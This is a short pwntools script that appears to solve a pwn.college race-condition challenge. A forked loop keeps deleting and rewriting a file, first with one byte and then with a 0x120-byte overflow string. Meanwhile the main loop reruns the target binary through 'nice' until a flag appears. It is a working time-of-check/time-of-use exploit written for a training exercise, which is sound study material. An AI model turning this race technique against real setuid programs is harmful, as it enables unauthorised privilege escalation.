#!/bin/python

import os
import sys
import time
from pwn import * 

#context.log_level = 'error'
context.arch = 'amd64'

FILE = '/home/hacker/file'
argv = ['nice', '-n19', sys.argv[1], FILE]

STR = 'X' * 0x120

if not os.fork():
    while True:
        os.unlink(FILE)
        with open(FILE, "w") as f: 
            f.write(' ')
            time.sleep(0.001)
            f.write(STR)
        

while True:
    proc = process(argv)
    try: 
        proc.recvuntil(b"pwn.college", timeout=1)
        print(proc.recvline())
        break
    except:
        pass


